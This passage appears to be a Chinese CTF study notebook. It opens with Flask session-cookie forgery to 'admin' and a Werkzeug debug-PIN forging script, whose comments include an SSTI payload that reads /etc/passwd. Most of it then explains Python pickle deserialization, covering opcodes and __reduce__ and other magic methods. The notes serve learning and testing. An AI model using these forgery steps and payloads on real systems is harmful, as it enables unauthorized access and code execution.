python flask_session_cookie_manager3.py decode -c eyJ1c2VyIjoidXNlciJ9.ZXV4OA.63R_94KNDsPsTIwGayzQBi6B2y4
b'{"user":"user"}'

python flask_session_cookie_manager3.py decode -c eyJ1c2VyIjoidXNlciJ9.ZXV4OA.63R_94KNDsPsTIwGayzQBi6B2y4 -s wi1shu
{'user': 'user'}

python flask_session_cookie_manager3.py encode -t "{'user':'admin'}" -s wi1shu
eyJ1c2VyIjoiYWRtaW4ifQ.ZXV8ZA.8JmyoQrizHyJrk1TL84S1xIqDgs
```



### pin码伪造

pin码计算脚本

```python
import hashlib
from itertools import chain

probably_public_bits = [
    'www',  # flask执⾏whoami获取
    'flask.app',  # modname，linux基本上都是这个，mac有所不同
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.8/dist-packages/flask/app.py'  # 可以通过debug报错的⻚⾯观察到。
]
# "".__class__.__bases__[0].__subclasses__()[279]('cat+/etc/passwd',shell=True,stdout=-1).communicate()[0].strip()
private_bits = [
    '2485377892354',  # ssti获取/sys/class/net/eth0/address
    '6079fc23-7220-4a30-aab3-c0a7a4f5fb62ea7476749876bc8a6302ce91efe1a0461e74a1778f0b9d516318fc5a032036e1'
    # ssti获取/proc/sys/kernel/random/boot_id + /proc/self/cgroup
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = f"__wzd{h.hexdigest()[:20]}"

num = None
if num is None:
    h.update(b'pinsalt')
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)

```



## Python 反序列化

>参考：[SecMap - 反序列化（Python） - Tr0y's Blog](https://www.tr0y.wang/2022/02/03/SecMap-unserialize-python/)
>
>[从零开始python反序列化攻击：pickle原理解析 & 不用reduce的RCE姿势 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/89132768)
>
>

### Python反序列化的相关库和方法

在 Python 中内置了标准库 `pickle`/`cPickle`（3.x 改名为 `_pickle`），用于序列化/反序列化的各种操作（Python 的官方文档中，称其为 封存/解封，意思其实差不多），比较常见的当然是 `dumps`（序列化）和 `loads`（反序列化）啦。其中 `pickle` 是用 Python 写的，`cPickle` 是用 C 语言写的，速度很快，但是它不允许用户从 `pickle` 派生子类。

![image-20230924213758854](daydayup.assets/image-20230924213758854.png)

另外有一点需要注意：对于我们自己定义的class，如果直接以形如`test = 1`的方式赋初值，**则这个`test`不会被打包！**解决方案是写一个`__init__`方法， 也就是这样：

![image-20230924194235905](daydayup.assets/image-20230924194235905.png)

###  PVM

要对序列化、反序列化很清楚的话，一定要了解 PVM，这背后又有非常多的细节。

首先，在调用 pickle 的时候，实际上是 `class pickle.Pickler` 和 `class pickle.Unpickler` 在起作用，而这两个类又是依靠 Pickle Virtual Machine(PVM)，在更深层对输入进行着某种操作，从而最后得到了那串复杂的结果。

PVM 由三部分组成：

1. 指令处理器：从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到`.`这个结束符后停止（看上面的代码示例，序列化之后的结果最后是`.`）。最终留在栈顶的值将被作为反序列化对象返回。需要注意的是：
   1. opcode 是单字节的
   2. 带参数的指令用换行符（`\n`）来确定边界
2. 栈区(stack)：用 list 实现的，被用来临时存储数据、参数以及对象。
3. 内存区(memo)：用 dict 实现的，为 PVM 的整个生命周期提供存储。

![image-20230924195131072](daydayup.assets/image-20230924195131072.png)

![image-20230924195149851](daydayup.assets/image-20230924195149851.png)

最后，PVM 还有协议一说，这里的协议指定了应该采用什么样的序列化、反序列化算法。

#### PVM 协议

当前共有 6 种不同的协议可用，使用的协议版本越高，读取所生成 pickle 对象所需的 Python 版本就要越新。

1. v0 版协议是原始的“人类可读”协议，并且向后兼容早期版本的 Python
2. v1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容
3. v2 版协议是在 Python 2.3 中加入的，它为存储 new-style class 提供了更高效的机制（参考 PEP 307）。
4. v3 版协议是在 Python 3.0 中加入的，它显式地支持 bytes 字节对象，不能使用 Python 2.x 解封。这是 Python 3.0-3.7 的默认协议。
5. v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化（参考 PEP 3154）。它是 Python 3.8 使用的默认协议。
6. v5 版协议是在 Python 3.8 中加入的。它增加了对带外数据的支持，并可加速带内数据处理（参考 PEP 574）

### opcode

```
MARK           = b'('   # 向栈中压入一个 MARK 标记
STOP           = b'.'   # 程序结束，栈顶的一个元素作为 pickle.loads() 的返回值
POP            = b'0'   # 丢弃栈顶对象
POP_MARK       = b'1'   # discard stack top through topmost markobject
DUP            = b'2'   # duplicate top stack item
FLOAT          = b'F'   # 实例化一个 float 对象
INT            = b'I'   # 实例化一个 int 或者 bool 对象
BININT         = b'J'   # push four-byte signed int
BININT1        = b'K'   # push 1-byte unsigned int
LONG           = b'L'   # push long; decimal string argument
BININT2        = b'M'   # push 2-byte unsigned int
NONE           = b'N'   # 栈中压入 None
PERSID         = b'P'   # push persistent object; id is taken from string arg
BINPERSID      = b'Q'   # push persistent object; id is taken from stack
REDUCE         = b'R'   # 从栈上弹出两个对象，第一个对象作为参数（必须为元组），第二个对象作为函数，然后调							用该函数并把结果压回栈
STRING         = b'S'   # 实例化一个字符串对象
BINSTRING      = b'T'   # push string; counted binary string argument
SHORT_BINSTRING= b'U'   # push string; counted binary string argument < 256 bytes
UNICODE        = b'V'   # 实例化一个 UNICODE 字符串对象
BINUNICODE     = b'X'   # push Unicode string; counted UTF-8 string argument
APPEND         = b'a'   # 将栈的第一个元素 append 到第二个元素（必须为列表）中
BUILD          = b'b'   # 使用栈中的第一个元素（储存多个 属性名-属性值 的字典）对第二个元素（对象实例）进							 行属性设置，调用 __setstate__ 或 __dict__.update()
GLOBAL         = b'c'   # 获取一个全局对象或 import 一个模块（会调用 import 语句，能够引入新的包），压						  入栈
DICT           = b'd'   # 寻找栈中的上一个 MARK，并组合之间的数据为字典（数据必须有偶数个，即呈 key-						  value 对），弹出组合，弹出 MARK，压回结果
EMPTY_DICT     = b'}'   # 向栈中直接压入一个空字典
APPENDS        = b'e'   # 寻找栈中的上一个 MARK，组合之间的数据并 extends 到该 MARK 之前的一个元素（必							须为列表）中
GET            = b'g'   # 将 memo[n] 的压入栈
BINGET         = b'h'   # push item from memo on stack; index is 1-byte arg
INST           = b'i'   # 相当于 c 和 o 的组合，先获取一个全局函数，然后从栈顶开始寻找栈中的上一个 							  MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）
LONG_BINGET    = b'j'   # push item from memo on stack; index is 4-byte arg
LIST           = b'l'   # 从栈顶开始寻找栈中的上一个 MARK，并组合之间的数据为列表
EMPTY_LIST     = b']'   # 向栈中直接压入一个空列表
OBJ            = b'o'   # 从栈顶开始寻找栈中的上一个 MARK，以之间的第一个数据（必须为函数）为 									  callable，第二个到第 n 个数据为参数，执行该函数（或实例化一个对象），弹出 							  MARK，压回结果，
PUT            = b'p'   # 将栈顶对象储存至 memo[n]
BINPUT         = b'q'   # store stack top in memo; index is 1-byte arg
LONG_BINPUT    = b'r'   # store stack top in memo; index is 4-byte arg
SETITEM        = b's'   # 将栈的第一个对象作为 value，第二个对象作为 key，添加或更新到栈的第三个对象（必							须为列表或字典，列表以数字作为 key）中
TUPLE          = b't'   # 寻找栈中的上一个 MARK，并组合之间的数据为元组，弹出组合，弹出 MARK，压回结果
EMPTY_TUPLE    = b')'   # 向栈中直接压入一个空元组
SETITEMS       = b'u'   # 寻找栈中的上一个 MARK，组合之间的数据（数据必须有偶数个，即呈 key-value 对）						  并全部添加或更新到该 MARK 之前的一个元素（必须为字典）中
BINFLOAT       = b'G'   # push float; arg is 8-byte float encoding

TRUE           = b'I01\n'  # not an opcode; see INT docs in pickletools.py
FALSE          = b'I00\n'  # not an opcode; see INT docs in pickletools.py
```

>```
>ai翻译
>
>MARK = b'('           # 在堆栈上推送特殊的标记对象
>STOP = b'.'           # 每个 pickle 序列化结束时都以 STOP 结尾
>POP = b'0'            # 弹出堆栈顶部的元素
>POP_MARK = b'1'       # 弹出堆栈顶部直到最上面的标记对象
>DUP = b'2'            # 复制堆栈顶部的元素
>FLOAT = b'F'          # 推送浮点数对象；十进制字符串参数
>INT = b'I'            # 推送整数或布尔值；十进制字符串参数
>BININT = b'J'         # 推送四字节有符号整数
>BININT1 = b'K'        # 推送一字节无符号整数
>LONG = b'L'           # 推送长整数；十进制字符串参数
>BININT2 = b'M'        # 推送两字节无符号整数
>NONE = b'N'           # 推送 None
>PERSID = b'P'         # 推送持久化对象；id 从字符串参数中获取
>BINPERSID = b'Q'      # 推送持久化对象；id 从堆栈中获取
>REDUCE = b'R'         # 对堆栈上的 argtuple 应用 callable 函数
>STRING = b'S'         # 推送字符串；以 NL 结尾的字符串参数
>BINSTRING = b'T'      # 推送字符串；计数的二进制字符串参数
>SHORT_BINSTRING = b'U' # 推送字符串；长度小于 256 字节的字符串参数
>UNICODE = b'V'        # 推送 Unicode 字符串；以 raw-unicode-escaped 方式转义的字符串参数
>BINUNICODE = b'X'     # 推送字符串；计数的 UTF-8 字符串参数
>APPEND = b'a'         # 将堆栈顶部的元素添加到下面的列表中
>BUILD = b'b'          # 调用 __setstate__ 或 __dict__.update()
>GLOBAL = b'c'         # 推送 self.find_class(modname, name)；两个字符串参数
>DICT = b'd'           # 从堆栈项构建字典
>EMPTY_DICT = b'}'     # 推送空字典
>APPENDS = b'e'        # 将堆栈上最上面的切片扩展到下面的列表中
>GET = b'g'            # 从 memo 中推送堆栈上的项；索引为字符串参数
>BINGET = b'h'         # 从 memo 中推送堆栈上的项；索引为一字节参数
>INST = b'i'           # 构建并推送类实例
>LONG_BINGET = b'j'    # 从 memo 中推送堆栈上的项；索引为四字节参数
>LIST = b'l'           # 从堆栈上的顶部项构建列表
>EMPTY_LIST = b']'     # 推送空列表
>OBJ = b'o'            # 构建并推送类实例
>PUT = b'p'            # 将堆栈顶部的元素存储在 memo 中；索引为字符串参数
>BINPUT = b'q'         # 将堆栈顶部的元素存储在 memo 中；索引为一字节参数
>LONG_BINPUT = b'r'    # 将堆栈顶部的元素存储在 memo 中；索引为四字节参数
>SETITEM = b's'        # 将键值对添加到字典中
>TUPLE = b't'          # 从堆栈上的顶部项构建元组
>EMPTY_TUPLE = b')'    # 推送空元组
>SETITEMS = b'u'       # 通过添加堆栈上最上面的键值对修改字典
>BINFLOAT = b'G'       # 推送浮点数；参数为 8 字节浮点数编码
>
>TRUE = b'I01\n'       # 不是一个操作码；参见 pickletools.py 中的 INT 文档
>FALSE = b'I00\n'      # 不是一个操作码；参见 pickletools.py 中的 INT 文档
>
># Protocol 2
>PROTO = b'\x80'       # 标识 pickle 协议
>NEWOBJ = b'\x81'      # 通过将 cls.__new__ 应用于 argtuple 构建对象
>EXT1 = b'\x82'        # 从扩展注册表中推送对象；一字节索引
>EXT2 = b'\x83'        # 同上，但是两字节索引
>EXT4 = b'\x84'        # 同上，但是四字节索引
>TUPLE1 = b'\x85'      # 从堆栈顶部构建 1 元组
>TUPLE2 = b'\x86'      # 从两个最上面的堆栈项构建 2 元组
>TUPLE3 = b'\x87'      # 从三个最上面的堆栈项构建 3 元组
>NEWTRUE = b'\x88'     # 推送 True
>NEWFALSE = b'\x89'    # 推送 False
>LONG1 = b'\x8a'       # 从 < 256 字节的字符串推送长整数
>LONG4 = b'\x8b'       # 推送非常大的长整数
>
>_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]
>
># Protocol 3 (Python 3.x)
>BINBYTES = b'B'       # 推送字节；计数的二进制字符串参数
>SHORT_BINBYTES = b'C' # 推送字节；长度小于 256 字节的字符串参数
>
># Protocol 4
>SHORT_BINUNICODE = b'\x8c'  # 推送短字符串；UTF-8 长度小于 256 字节
>BINUNICODE8 = b'\x8d'       # 推送非常长的字符串
>BINBYTES8 = b'\x8e'         # 推送非常长的字节字符串
>EMPTY_SET = b'\x8f'         # 在堆栈上推送空集合
>ADDITEMS = b'\x90'          # 通过添加堆栈上最上面的项修改集合
>FROZENSET = b'\x91'         # 从堆栈上的最上面的项构建 frozenset
>NEWOBJ_EX = b'\x92'         # 类似于 NEWOBJ，但与仅关键字参数一起使用
>STACK_GLOBAL = b'\x93'      # 类似于 GLOBAL，但使用堆栈上的名称
>MEMOIZE = b'\x94'           # 将堆栈顶部的元素存储在 memo 中
>FRAME = b'\x95'             # 表示新帧的开始
>
># Protocol 5
>BYTEARRAY8 = b'\x96'        # 推送 bytearray
>NEXT_BUFFER = b'\x97'       # 推送下一个带外缓冲区
>READONLY_BUFFER = b'\x98'   # 将堆栈顶部设为只读
>
>```

### Python反序列化的过程

反序列化中主要的是栈，栈有两个部分很重要，一个是`stack`，一个是`metastack`。栈最核心的数据结构，所有的数据操作几乎都在栈上。为了应对数据嵌套，栈区分为两个部分：`stack`专注于维护**最顶层的信息**，而`metastack`维护下层的信息。这两个栈区的操作过程将在讨论MASK指令时解释。

还有一部分是存储区（`memo`），存储区可以类比内存，用于存取变量。它是一个数组，用来存储序列化过程中已经遇到的对象及其对应的序列化数据，数组的索引（下标）对应对象的 ID。它的每一个单元可以用来存储任何东西，但是说句老实话，大多数情况下我们并不需要这个存储区。

![image-20230924214334571](daydayup.assets/image-20230924214334571.png)

>在 Python 的 `pickle` 序列化和反序列化过程中，`memo` 存储区用于避免循环引用和重复序列化对象。
>
>具体作用如下：
>
>1. **避免循环引用**:
>   - Python 对象之间可能存在循环引用，即对象 A 引用了对象 B，而对象 B 又引用了对象 A。在序列化时，如果不加控制，会陷入无限递归。`memo` 存储区记录已经序列化的对象的 ID，从而避免无限递归。
>2. **避免重复序列化**:
>   - 在 pickle 中，对象可能会在多个地方被引用，如果在序列化过程中重复序列化这些对象，会浪费空间和时间。`memo` 存储区可以避免这种情况，因为它会记录已经序列化的对象，当再次遇到相同对象时，直接引用其序列化后的位置，而不是重复序列化。

>### _loads
>
>pickle内反序列化的源码中，有几个比较关键的方法`readline()`、`pop_mark()`、`pop()`
>
>![image-20231018210055979](daydayup.assets/image-20231018210055979.png)
>
>![image-20231018210333448](daydayup.assets/image-20231018210333448.png)
>
>- `readline()`的作用是读取仍未入栈的一行数据，是`opcode`后面的数据
>  ![image-20231018211028100](daydayup.assets/image-20231018211028100.png)
>- `pop_mark()`的作用是弹出`MARK`栈，将放在前序栈（`metastack`）中的栈（`stack`）数据放回栈中
>  ![image-20231018211315803](daydayup.assets/image-20231018211315803.png)
>- `stack.pop()`的作用是弹出栈中的第一个数据
>
>剩下的一些方法都能够看函数名得知作用，这三个的操作流程影响手写`opcode`，所以拿出来单说

分析一下上面的代码

![image-20230924213916991](daydayup.assets/image-20230924213916991.png)

```
b'\x80\x03c__main__\ntest\nq\x00)\x81q\x01}q\x02X\x04\x00\x00\x00testq\x03K\x01sb.'
    0: \x80 PROTO      3
    2: c    GLOBAL     '__main__ test'
   17: )    EMPTY_TUPLE
   18: \x81 NEWOBJ
   19: }    EMPTY_DICT
   20: X    BINUNICODE 'test'
   29: K    BININT1    1
   31: s    SETITEM
   32: b    BUILD
   33: .    STOP
highest protocol among opcodes = 2
```

首先`\x80`制定协议版本为`3`，然后`c`导入`__main__`中的`test`模块，然后`）`向栈中直接压入一个空元组![img](daydayup.assets/0169dce8fd5162b87e28e7f0cee4117b.png)

然后`\x81`弹出栈顶的两个元素，第一个弹出的元素作为参数，第二个弹出的元素作为类，然后对该类进行初始化，再给初始化后的类压入栈中![image-20230924214520196](daydayup.assets/image-20230924214520196.png)

>```python
>class CapStr(str):
>    def __new__(cls, *args):
>        self_in_init = super().__new__(cls, *args)
>        print("__new__ id -> " + str(id(self_in_init)))
>        print("__new__ args -> " + str(args))
>        return self_in_init
>
>    def __init__(self, string):
>        print("__init__ string -> " + string)
>        print("__init__ id -> " + str(id(self)))
>
>
>a = CapStr("I love China!")
>print("a id -> " + str(id(a)))
>
>```
>
>__new__ id -> 1799333919200
>__new__ args -> ('I love China!',)
>__init__ string -> I love China!
>__init__ id -> 1799333919200
>a id -> 1799333919200

这样之后栈顶的元素就为实例化的类`test`，`}`向栈中压入一个空的字典，`X`将 Unicode 字符串`test`编码成 UTF-8 字节流并压入栈中
![image-20231005202632907](daydayup.assets/image-20231005202632907.png)

`K`向栈中压入一个一字节无符号整数，在这里也就是`1`
![image-20231005203433609](daydayup.assets/image-20231005203433609.png)

>`unpack` 函数是 Python 中 `struct` 模块提供的一个用于解析字节流的函数。`struct` 模块允许你将 Python 数据类型转换为字节流（称为"pack"）和将字节流解析为 Python 数据类型（称为"unpack"）。
>
>函数签名：
>
>```python
>struct.unpack(format, buffer)
>```
>
>- `format` 参数指定了字节流的格式，以及如何解析这个字节流。它是一个字符串，其中包含了格式化指令，用于指定字节流中数据的类型、大小和顺序。
>- `buffer` 参数是要解析的字节流，通常是一个 bytes 对象。
>
>`unpack` 函数根据指定的格式字符串解析字节流，并返回一个元组，包含解析得到的数据。格式字符串中的格式化指令告诉 `unpack` 如何解析字节流，并将解析得到的数据以元组的形式返回。
>
>例如，如果你有一个 4 字节的字节流，表示一个无符号整数（采用小端字节序），可以使用以下方式解析：
>
>```python
>import struct
>
>data = b'\x01\x00\x00\x00'  # 4-byte little-endian representation of the number 1
>unpacked_data = struct.unpack('<I', data)  # Unpack as an unsigned integer in little-endian format
>print(unpacked_data)  # Output: (1,)
>```
>
>在这个示例中，`format` 参数为 `<I`，表示小端字节序（`<`）的无符号整数（`I`）。`unpack` 函数解析字节流 `data`，将其解释为一个小端字节序的无符号整数，返回的元组中包含解析得到的数值。
>
>>小端字节序（Little Endian）是一种字节序排列方式，其中数值的低位字节存储在内存的低地址处，高位字节存储在内存的高地址处。这意味着数值的最低有效字节（最右边的字节）会存储在内存中的最低地址，而最高有效字节（最左边的字节）会存储在内存中的高地址。
>>
>>举个简单的例子，假设我们有一个 32 位整数 0x12345678（十六进制表示），在小端字节序下，它在内存中的存储方式如下：
>>
>>```
>>Address:  0x1000   0x1001   0x1002   0x1003
>>Data:     0x78     0x56     0x34     0x12
>>```
>>
>>- 地址 0x1000 存储了最低有效字节（0x78），地址递增代表字节的位置递增。
>>- 地址 0x1003 存储了最高有效字节（0x12），即整数的最高位。
>>
>>在小端字节序下，读取多字节数据时，我们先读取最低有效字节，再依次读取高位字节，即从低地址向高地址读取。
>>
>>小端字节序在许多计算机体系结构中被广泛采用，包括 x86 和 x86-64 架构等。

`s`弹出栈顶两个元素，第一个作为value，第二个作为key，添加或更新到弹出上述两个元素之后的栈顶元素中（必须为列表或字典）
![image-20231005203832120](daydayup.assets/image-20231005203832120.png)

`b`将弹出栈顶元素，然后利用该元素对弹出上述元素后的栈顶元素进行属性设置，利用`__setstate__()`(如果它存在的话就用它，不存在就用下面的)或者`__dict__`，这边就是将属性`test=1`赋给实例`test`，最后`.`结束。
![image-20231005205154634](daydayup.assets/image-20231005205154634.png)

>### `__setstate__()` 
>
>`__setstate__()` 是 Python 中用于自定义反序列化过程的特殊方法。它允许在反序列化对象时对对象进行额外的处理和初始化。
>
>当使用 Pickle 模块反序列化对象时，如果对象实现了 `__setstate__()` 方法，Pickle 将在反序列化后调用该方法，将反序列化的状态信息传递给对象，以便自定义对象的恢复过程。
>
>方法签名如下：
>```python
>def __setstate__(self, state):
>    # Custom deserialization logic
>    pass
>```
>
>- `self`：对象实例。
>- `state`：包含了反序列化的状态信息的字典或其他数据结构。
>
>开发者可以在 `__setstate__()` 方法中根据自己的需求解析传递进来的状态信息，并据此初始化对象的属性。这允许进行一些定制的初始化操作，以确保对象在反序列化后的状态是正确的。
>
>举个简单的例子：
>
>```python
>import pickle
>
>class CustomObject:
>    def __init__(self):
>        self.value = 0
>
>    def __setstate__(self, state):
>        self.value = state.get('value', 0)
>
>    def __repr__(self):
>        return f'CustomObject(value={self.value})'
>
># Serialize an instance of CustomObject
>original_object = CustomObject()
>original_object.value = 42
>serialized_object = pickle.dumps(original_object)
>
># Deserialize the object and invoke __setstate__()
>deserialized_object = pickle.loads(serialized_object)
>print(deserialized_object)  # Output: CustomObject(value=42)
>```
>
>在上面的例子中，`CustomObject` 实现了 `__setstate__()` 方法，用于在反序列化时根据传递的状态信息更新对象的属性。
>
>### `sys.intern()` 
>
>`sys.intern()` 是 Python 的内置函数，用于在 Python 字符串池中查找字符串。字符串池是一个特殊的数据结构，它保存了 Python 中所有字符串对象的唯一实例，以避免重复创建相同的字符串。
>
>具体地说，`sys.intern()` 函数接受一个字符串作为参数，它会将该字符串放入字符串池中并返回一个对该字符串的引用。如果字符串已存在于字符串池中，则返回现有的引用。这样可以确保相同内容的字符串在内存中只存在一份，从而节省内存并提高字符串比较的效率。
>
>举个例子：
>
>```python
>import sys
>
>s1 = 'hello'
>s2 = 'hello'
>
># Check if s1 and s2 point to the same object
>print(s1 is s2)  # Output: True
>
># Use sys.intern to force the strings to point to the same object in the pool
>s1 = sys.intern('hello')
>s2 = sys.intern('hello')
>
># Check if s1 and s2 point to the same object after interning
>print(s1 is s2)  # Output: True
>```
>
>在这个例子中，`sys.intern('hello')` 将字符串 'hello' 放入字符串池，并返回该字符串的引用。在后续的对同样内容的字符串进行 intern 操作后，它们都会指向字符串池中的同一个对象。
>
>这个函数通常在处理大量字符串时，特别是需要比较字符串的场景下，能够提高程序的性能。
>
>### slotstate
>
>在提供的代码中，`slotstate` 变量用于存储反序列化过程中可能的“slot state”，并在适当的情况下应用到对象实例中。
>
>“slot state” 是指对象的状态信息，通常用于描述那些无法直接通过 `__dict__` 存储的状态，例如特殊的槽位（slots）。Python 中，槽位是一种在类定义中用于存储属性的机制，与常规的 `__dict__` 不同。
>
>在反序列化对象时，有时候对象的状态信息可能不仅仅通过 `__dict__` 存储，可能还依赖于类定义中的槽位（slots）等其他机制。`slotstate` 用于存储这些额外的状态信息，以确保对象在反序列化后完全恢复到正确的状态。
>
>具体来说，这段代码的逻辑如下：
>
>1. 首先，尝试从状态信息中解析出 `slotstate`（如果存在）。
>2. 然后，如果有 `state`，将 `state` 的内容应用到对象的 `__dict__` 中。
>3. 最后，如果有 `slotstate`，将 `slotstate` 中的内容通过 `setattr()` 函数应用到对象实例中。
>
>这样，可以确保对象的状态信息完整地被恢复，无论是通过普通属性 (`__dict__`) 还是特殊的槽位（slots）存储。

### 相关魔术方法

#### `__reduce__()`

opcode中的`R`就是`__reduce__()`，他干了这件事

- 取当前栈的栈顶记为`args`，然后把它弹掉。
- 取当前栈的栈顶记为`f`，然后把它弹掉。
- 以`args`为参数，执行函数`f`，把结果压进当前栈。

class的`__reduce__`方法，在pickle反序列化的时候会被执行。其底层的编码方法，就是利用了`R`指令码。 `f`要么返回字符串，要么返回一个tuple，后者对我们而言更有用（返回的对象通常称为 “reduce 值”）。

如果返回字符串，该字符串会被当做一个全局变量的名称。它应该是对象相对于其模块的本地名称，pickle 模块会搜索模块命名空间来确定对象所属的模块。这种行为常在单例模式使用。**（复现不出来）**

如果返回的是元组，则应当包含 2 到 6 个元素，可选元素可以省略或设置为 None。每个元素代表的意义如下：

1. 一个可调用对象，该对象会在创建对象的最初版本时调用。
2. 可调用对象的参数，是一个元组。如果可调用对象不接受参数，必须提供一个空元组。
3. 可选元素，用于表示对象的状态，将被传给前述的 `__setstate__()` 方法。如果对象没有此方法，则这个元素必须是字典类型，并会被添加至 `__dict__` 属性中。
4. 可选元素，一个返回连续项的迭代器（而不是序列）。这些项会被 `obj.append(item)` 逐个加入对象，或被 `obj.extend(list_of_items)` 批量加入对象。这个元素主要用于 list 的子类，也可以用于那些正确实现了 `append()` 和 `extend()` 方法的类。（具体是使用 `append()` 还是 `extend()` 取决于 pickle 协议版本以及待插入元素的项数，所以这两个方法必须同时被类支持）
5. 可选元素，一个返回连续键值对的迭代器（而不是序列）。这些键值对将会以 `obj[key] = value` 的方式存储于对象中。该元素主要用于 dict 子类，也可以用于那些实现了 `__setitem__()` 的类。
6. 可选元素，一个带有 `(obj, state)` 签名的可调用对象。该可调用对象允许用户以编程方式控制特定对象的状态更新行为，而不是使用 obj 的静态 `__setstate__()` 方法。如果此处不是 None，则此可调用对象的优先级高于 obj 的 `__setstate__()`。

可以看出，其实 pickle 并不直接调用上面的几个函数。事实上，它们实现了 `__reduce__()` 这一特殊方法。尽管这个方法功能很强，但是直接在类中实现 `__reduce__()` 容易产生错误。因此，设计类时应当尽可能的使用高级接口（比如 `__getnewargs_ex__()`、`__getstate__()` 和 `__setstate__()`）。后面仍然可以看到直接实现 `__reduce__()` 接口的状况，可能别无他法，可能为了获得更好的性能，或者两者皆有之。

>##### `__reduce_ex__()`
>
>作为替代选项，也可以实现 `__reduce_ex__()` 方法。此方法的唯一不同之处在于它接受一个整型参数用于指定协议版本。如果定义了这个函数，则会覆盖 `__reduce__()` 的行为。此外，`__reduce__()` 方法会自动成为扩展版方法的同义词。这个函数主要用于为以前的 Python 版本提供向后兼容的 reduce 值。

#### `__setstate__()` 

`__setstate__()` 是 Python 中用于自定义反序列化过程的特殊方法。它允许在反序列化对象时对对象进行额外的处理和初始化。

当使用 Pickle 模块反序列化对象时，如果对象实现了 `__setstate__()` 方法，Pickle 将在反序列化后调用该方法，将反序列化的状态信息传递给对象，以便自定义对象的恢复过程。

方法签名如下：

```python
def __setstate__(self, state):
    # Custom deserialization logic
    pass
```

- `self`：对象实例。
- `state`：包含了反序列化的状态信息的字典或其他数据结构。

开发者可以在 `__setstate__()` 方法中根据自己的需求解析传递进来的状态信息，并据此初始化对象的属性。这允许进行一些定制的初始化操作，以确保对象在反序列化后的状态是正确的。

举个简单的例子：

```python
import pickle

class CustomObject:
    def __init__(self):
        self.value = 0

    def __setstate__(self, state):
        self.value = state.get('value', 0)

    def __repr__(self):
        return f'CustomObject(value={self.value})'

# Serialize an instance of CustomObject
original_object = CustomObject()
original_object.value = 42
serialized_object = pickle.dumps(original_object)

# Deserialize the object and invoke __setstate__()
deserialized_object = pickle.loads(serialized_object)
print(deserialized_object)  # Output: CustomObject(value=42)
```

在上面的例子中，`CustomObject` 实现了 `__setstate__()` 方法，用于在反序列化时根据传递的状态信息更新对象的属性。

#### `__getstate__()`

类还可以进一步控制实例的封存过程。如果类定义了 `__getstate__()`，它就会被调用，其返回的对象是被当做实例内容来封存的，否则封存的是实例的 `__dict__`。如果 `__getstate__()` 未定义，实例的 `__dict__` 会被照常封存

`__getstate__()` 是一个特殊方法，用于自定义对象的序列化过程。当你使用 Python 的 `pickle` 模块或其他序列化工具来将对象转换为字节流时，`__getstate__()` 方法会被调用。

在默认情况下，`pickle` 会尝试序列化对象的所有属性。但是，有时你可能希望控制哪些属性被序列化，或者在序列化过程中进行一些额外的处理。

通过在你的对象中实现 `__getstate__()` 方法，你可以自定义对象的序列化行为。`__getstate__()` 方法应该返回一个字典，其中包含你希望序列化的属性和对应的值。只有在返回的字典中的属性才会被序列化。

下面是一个示例，展示了如何使用 `__getstate__()` 方法来控制对象的序列化过程：

```python
import pickle

class Point:
    def __init__(self, x, y):
        self.x = x
        self.y = y

    def __getstate__(self):
        state = self.__dict__.copy()
        # 不序列化 y 属性
        del state['y']
        return state

    def __setstate__(self, state):
        self.__dict__.update(state)

point = Point(1, 2)

# 序列化对象
serialized = pickle.dumps(point)

# 反序列化对象
deserialized = pickle.loads(serialized)

print(deserialized.x)  # 输出: 1
print(deserialized.y)  # 抛出 AttributeError: 'Point' object has no attribute 'y'
```

在上面的示例中，我们在 `__getstate__()` 方法中删除了 `y` 属性，因此在序列化过程中只有 `x` 属性被保存。在反序列化后，我们可以看到 `y` 属性不存在。

总结起来，通过实现 `__getstate__()` 方法，你可以自定义对象的序列化过程，选择性地序列化属性，并在序列化过程中进行额外的处理。这使得你能够更好地控制对象的序列化行为。

#### `__getnewargs__()`

`__getnewargs__()` 方法是 Python 中的一个特殊方法，用于与 `__new__()` 方法配合，自定义对象的序列化和反序列化行为。序列化是将对象的状态转换为字节流的过程，而反序列化是从字节流中重建对象的过程。

当对象被序列化时，会调用 `__getnewargs__()` 方法来确定在反序列化过程中传递给对象的 `__new__()` 方法的参数。这样可以控制对象在反序列化时的重建方式。

下面是一个示例，演示了 `__getnewargs__()` 方法的用法：

```python
import pickle

class Point:
    def __init__(self, x, y):
        self.x = x
        self.y = y

    def __getnewargs__(self):
        return (self.x, self.y)

    def __new__(cls, x, y):
        return super().__new__(cls)

    def __repr__(self):
        return f"Point({self.x}, {self.y})"

# 创建一个 Point 对象
p1 = Point(1, 2)
print(p1)  # 输出: Point(1, 2)

# 序列化对象
data = pickle.dumps(p1)

# 反序列化对象
p2 = pickle.loads(data)
print(p2)  # 输出: Point(1, 2)
```

在上面的示例中，`Point` 类定义了 `__getnewargs__()` 方法，它返回包含参数 `(self.x, self.y)` 的元组。在反序列化过程中，将使用这些参数调用 `__new__()` 方法来创建 `Point` 类的新实例。

如果未定义 `__getnewargs__()` 方法，那么`__new__()`方法不会被传入任何参数

```python
import pickle

class Point:
    def __init__(self, x, y):
        self.x = x
        self.y = y

  # def __getnewargs__(self):
      # return (self.x, self.y)

    def __new__(cls, x, y):
        return super().__new__(cls)

    def __repr__(self):
        return f"Point({self.x}, {self.y})"

# 创建一个 Point 对象
p1 = Point(1, 2)
print(p1) 

# 序列化对象
data = pickle.dumps(p1)

# 反序列化对象
p2 = pickle.loads(data)
print(p2)


'''
Point(1, 2)
Traceback (most recent call last):
